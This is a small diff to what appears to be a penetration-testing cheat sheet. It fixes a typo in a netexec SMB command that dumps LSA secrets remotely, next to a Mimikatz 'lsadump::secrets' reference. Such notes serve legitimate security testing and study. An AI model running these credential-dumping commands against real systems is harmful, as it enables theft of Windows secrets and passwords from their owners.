@@ -41,5 +41,5 @@ lsadump::secrets
 ```
 -Using netexec to dump LSA secrets remotely:
 ```
-netexec smb <ip> --local-auth -u <username> -p <password? --lsa
+netexec smb <ip> --local-auth -u <username> -p <password> --lsa
 ```
